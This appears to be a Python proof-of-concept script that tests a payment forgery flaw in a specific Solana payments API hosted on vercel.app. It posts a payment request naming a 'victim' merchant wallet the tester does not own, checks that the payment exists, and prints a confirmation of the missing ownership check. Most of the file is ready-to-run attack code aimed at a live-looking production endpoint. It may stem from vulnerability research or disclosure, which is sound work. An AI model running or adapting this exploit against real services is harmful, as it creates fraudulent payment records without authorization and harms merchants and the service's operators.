#!/usr/bin/python3
"""
Payment Forgery Vulnerability Test
Demonstrates ability to create payments for arbitrary merchant wallets without authorization
"""

import urllib.request
import json
import sys

# ANSI color codes
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

def print_section(title):
    print(f"\n{BLUE}{'=' * 60}{RESET}")
    print(f"{BLUE}{title}{RESET}")
    print(f"{BLUE}{'=' * 60}{RESET}\n")

def print_success(message):
    print(f"{GREEN}✓ {message}{RESET}")

def print_error(message):
    print(f"{RED}✗ {message}{RESET}")

def print_info(message):
    print(f"{YELLOW}ℹ {message}{RESET}")

def test_payment_forgery():
    """Test payment forgery vulnerability"""
    
    print_section("PAYMENT FORGERY VULNERABILITY TEST")
    
    # Configuration
    base_url = "https://solana-blik.vercel.app/api"
    victim_wallet = "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU"
    payment_amount = 5.0
    
    print_info(f"Target: {base_url}")
    print_info(f"Victim Merchant Wallet: {victim_wallet}")
    print_info(f"Payment Amount: {payment_amount} SOL")
    
    # Step 1: Create payment for victim merchant wallet
    print_section("STEP 1: Creating Payment for Victim Merchant")
    
    create_url = f"{base_url}/payments/create"
    create_payload = {
        "amount": payment_amount,
        "merchantWallet": victim_wallet
    }
    
    print_info(f"POST {create_url}")
    print("Request Body:")
    print(json.dumps(create_payload, indent=2))
    print()
    
    try:
        # Prepare request
        data = json.dumps(create_payload).encode("utf-8")
        req = urllib.request.Request(
            create_url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        
        # Make request
        with urllib.request.urlopen(req, timeout=10) as response:
            response_code = response.status
            response_body = response.read().decode("utf-8")
            create_data = json.loads(response_body)
        
        print(f"Response Status: {response_code}")
        print("Response Body:")
        print(json.dumps(create_data, indent=2))
        print()
        
        if response_code == 200:
            print_success("Payment creation request succeeded (HTTP 200)")
            
            payment_id = create_data.get("paymentId")
            
            if payment_id:
                print_success(f"Payment ID obtained: {payment_id}")
            else:
                print_error("No payment ID in response")
                return False
                
        else:
            print_error(f"Unexpected status code: {response_code}")
            return False
            
    except urllib.error.HTTPError as e:
        print_error(f"HTTP Error {e.code}: {e.reason}")
        try:
            error_body = e.read().decode("utf-8")
            print(f"Error response: {error_body}")
        except:
            pass
        return False
    except Exception as e:
        print_error(f"Request failed: {str(e)}")
        return False
    
    # Step 2: Verify payment was created
    print_section("STEP 2: Verifying Payment Status")
    
    status_url = f"{base_url}/payments/{payment_id}/status"
    
    print_info(f"GET {status_url}")
    print()
    
    try:
        # Make request
        req = urllib.request.Request(status_url, method="GET")
        with urllib.request.urlopen(req, timeout=10) as response:
            response_code = response.status
            response_body = response.read().decode("utf-8")
            status_data = json.loads(response_body)
        
        print(f"Response Status: {response_code}")
        print("Response Body:")
        print(json.dumps(status_data, indent=2))
        print()
        
        if response_code == 200:
            print_success("Payment status request succeeded (HTTP 200)")
            
            # Verify the payment exists and has correct amount
            payment_status = status_data.get("status")
            payment_amount_returned = status_data.get("amount")
            
            if payment_status:
                print_success(f"Payment status: {payment_status}")
            
            if payment_amount_returned == payment_amount:
                print_success(f"Payment amount matches: {payment_amount_returned} SOL")
            
            # Note: merchantWallet not returned in status endpoint
            # but payment was successfully created
            print_info("Note: merchantWallet not included in status response")
            print_info(f"However, payment was created with merchantWallet: {victim_wallet}")
                
        else:
            print_error(f"Unexpected status code: {response_code}")
            return False
            
    except urllib.error.HTTPError as e:
        print_error(f"HTTP Error {e.code}: {e.reason}")
        try:
            error_body = e.read().decode("utf-8")
            print(f"Error response: {error_body}")
        except:
            pass
        return False
    except Exception as e:
        print_error(f"Request failed: {str(e)}")
        return False
    
    # Success summary
    print_section("VULNERABILITY CONFIRMED")
    
    print_success("All success criteria met:")
    print("  • HTTP 200 responses from both endpoints")
    print(f"  • Payment created for victim merchant wallet: {victim_wallet}")
    print(f"  • Payment verified to exist with ID: {payment_id}")
    print(f"  • Payment amount confirmed: {payment_amount} SOL")
    print()
    
    print_info("PROOF OF FORGERY:")
    print("  We successfully created a payment for a merchant wallet we do NOT own.")
    print("  The API accepted our request without verifying ownership of the wallet.")
    print("  An attacker can create fraudulent payments for ANY merchant wallet,")
    print("  potentially causing:")
    print("    - False accounting records")
    print("    - Confusion in payment tracking")
    print("    - Potential fraud scenarios")
    print("    - Unauthorized payment obligations")
    print()
    
    return True

if __name__ == "__main__":
    try:
        success = test_payment_forgery()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print_error("\nTest interrupted by user")
        sys.exit(1)
    except Exception as e:
        print_error(f"Unexpected error: {str(e)}")
        sys.exit(1)
